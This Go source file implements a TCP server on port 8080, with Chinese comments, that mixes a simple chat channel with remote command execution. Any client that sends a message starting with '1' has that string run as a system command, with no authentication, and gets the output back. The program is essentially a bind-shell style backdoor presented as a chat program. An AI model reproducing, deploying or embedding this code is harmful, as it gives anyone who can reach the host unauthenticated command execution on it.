package main

import (
	"fmt"
	"io/ioutil"
	"net"
	"os/exec"
	"strings"
)

func main() {
	listen, err := net.Listen("tcp", ":8080")
	if err != nil {
		fmt.Println(err)
		return
	}
	defer listen.Close()
	for  {
		conn, err := listen.Accept()
		if err!=nil {
			fmt.Println(err)
			return
		}
		go Server(conn)
	}
}

func Server(conn net.Conn) {
	if conn == nil {
		return
	}
	// 接收数据， 处理
	for  {
		buf := make([]byte, 4096)
		cnt, err := conn.Read(buf)
		if cnt == 0 || err != nil {
			conn.Close()
			return
		}
		recv := string(buf)
		if recv[0] == '0' {
			fmt.Println("收到聊天",recv[1:])
			//处理聊天
			var input string
			fmt.Scanln(&input)
			conn.Write([]byte("0"+input ))
		}else if recv[0] == '1' {
			fmt.Println("收到命令",recv[1:])
			//执行命令
			conn.Write([]byte("1"+GoCmdWithResult(recv[1:cnt])))
		}
	}
}

func GoCmdWithResult(cmdstr string) string {
	cmdstr = strings.TrimSpace(cmdstr)
	cmd := exec.Command(cmdstr)
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return "error1"
	}
	if err := cmd.Start(); err != nil {
		return "error2"
	}
	outbyte, err := ioutil.ReadAll(stdout)
	stdout.Close()
	if err := cmd.Wait(); err != nil {
		return "error3"
	}
	return string(outbyte)
}
